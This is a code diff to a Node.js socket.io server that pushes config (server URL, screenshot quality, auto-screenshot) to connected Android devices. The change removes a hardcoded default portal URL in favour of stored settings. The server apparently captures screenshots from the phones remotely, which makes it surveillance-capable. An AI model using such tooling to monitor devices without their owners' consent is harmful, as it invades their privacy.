@@ -7,23 +7,6 @@ import { db } from './db.js';
 
 const serverPort = 4000;
 
-// Initialize with default values if not exists
-async function initializeDefaultValues() {
-    try {
-        const defaultConfig = await db.getDefaultConfig();
-        if (!defaultConfig) {
-            const defaultServerUrl = `https://android-portal.tunegociosmart.com.ar/android`;
-            await db.run(
-                'INSERT OR IGNORE INTO default_config (id, server_url, screenshot_quality, auto_screenshot) VALUES (1, ?, ?, ?)',
-                defaultServerUrl, 70, 1
-            );
-            console.log(chalk.green('[+] Default config initialized in database with default values'));
-        }
-    } catch (error) {
-        console.error('Error initializing default config in database:', error);
-    }
-}
-
 // Generate device config from default config
 async function generateDeviceConfig(deviceUuid) {
     try {
@@ -42,7 +25,8 @@ async function generateDeviceConfig(deviceUuid) {
         // If not exists, generate from default config
         const defaultConfig = await db.getDefaultConfig();
         if (!defaultConfig) {
-            throw new Error('Default config not found');
+            console.log(chalk.yellow(`[!] Cannot generate config for device ${deviceUuid}: default config not found`));
+            return null;
         }
 
         // Save new config to DB
@@ -62,17 +46,10 @@ async function generateDeviceConfig(deviceUuid) {
         };
     } catch (error) {
         console.error('Error generating device config:', error);
-        // Fallback to default config
-        return {
-            server_url: 'https://android-portal.tunegociosmart.com.ar/android',
-            screenshot_quality: 70,
-            auto_screenshot: true
-        };
+        return null;
     }
 }
 
-// Call initializeDefaultValues after DB is ready
-initializeDefaultValues();
 const devices = new Map(); // Map<device_uuid, {info: data, socket: socket}>
 const pendingScreenshotResponses = new Map(); // Map<request_id, {device_uuid, timeout}>
 
@@ -184,8 +161,12 @@ androidIo.on("connection", async (socket) => {
 
         // Generate config for this device from default config
         const deviceConfig = await generateDeviceConfig(deviceUuid);
-        socket.emit("config_data", deviceConfig);
-        console.log(chalk.blue(`[i] Sent config to device ${deviceUuid}:`, JSON.stringify(deviceConfig)));
+        if (deviceConfig) {
+            socket.emit("config_data", deviceConfig);
+            console.log(chalk.blue(`[i] Sent config to device ${deviceUuid}:`, JSON.stringify(deviceConfig)));
+        } else {
+            console.log(chalk.yellow(`[!] Cannot send config to device ${deviceUuid}: server_url is null in default config`));
+        }
 
         // Broadcast updated device list to frontend
         const deviceList = Array.from(devices.values()).map((d) => ({
@@ -585,11 +566,11 @@ frontendIo.on("connection", async (socket) => {
     socket.on("get_default_config", async () => {
         try {
             const defaultConfig = await db.getDefaultConfig();
-            socket.emit("default_config_data", defaultConfig || {
-                server_url: 'https://android-portal.tunegociosmart.com.ar/android',
-                screenshot_quality: 70,
-                auto_screenshot: 1
-            });
+            if (!defaultConfig) {
+                socket.emit("default_config_error", { error: 'Default config not found' });
+                return;
+            }
+            socket.emit("default_config_data", defaultConfig);
         } catch (error) {
             console.error('Error getting default config:', error);
             socket.emit("default_config_error", { error: error.message });
@@ -608,9 +589,21 @@ frontendIo.on("connection", async (socket) => {
                 throw new Error('screenshot_quality must be between 1 and 100');
             }
 
-            await db.updateDefaultConfig(server_url, screenshot_quality, auto_screenshot);
+            // Check if default config exists
+            const existingConfig = await db.getDefaultConfig();
+            if (existingConfig) {
+                // Update existing config
+                await db.updateDefaultConfig(server_url, screenshot_quality, auto_screenshot);
+                console.log(chalk.green(`[+] Default config updated by frontend ${socket.id}`));
+            } else {
+                // Create new config
+                await db.run(
+                    'INSERT INTO default_config (id, server_url, screenshot_quality, auto_screenshot) VALUES (1, ?, ?, ?)',
+                    server_url, screenshot_quality, auto_screenshot ? 1 : 0
+                );
+                console.log(chalk.green(`[+] Default config created by frontend ${socket.id}`));
+            }
 
-            console.log(chalk.green(`[+] Default config updated by frontend ${socket.id}`));
             socket.emit("default_config_updated", { success: true });
 
             // Notify all frontends
@@ -679,10 +672,20 @@ frontendIo.on("connection", async (socket) => {
             } else {
                 // If not exists, generate from default config
                 const generatedConfig = await generateDeviceConfig(deviceUuid);
-                socket.emit("device_config_data", {
-                    device_uuid: deviceUuid,
-                    ...generatedConfig
-                });
+                if (generatedConfig) {
+                    socket.emit("device_config_data", {
+                        device_uuid: deviceUuid,
+                        ...generatedConfig
+                    });
+                } else {
+                    // If cannot generate (server_url is null), send null config
+                    socket.emit("device_config_data", {
+                        device_uuid: deviceUuid,
+                        server_url: null,
+                        screenshot_quality: 70,
+                        auto_screenshot: true
+                    });
+                }
             }
         } catch (error) {
             console.error('Error getting device config:', error);
@@ -744,6 +747,12 @@ frontendIo.on("connection", async (socket) => {
 
             // Regenerate from default config
             const newConfig = await generateDeviceConfig(deviceUuid);
+
+            // If server_url is null in default config, cannot reset to default
+            if (!newConfig) {
+                socket.emit("device_config_error", { error: 'Cannot reset: server_url is not set in default config' });
+                return;
+            }
 
             console.log(chalk.green(`[+] Config reset to default for device ${deviceUuid}`));
             socket.emit("device_config_reset", { success: true, device_uuid: deviceUuid });
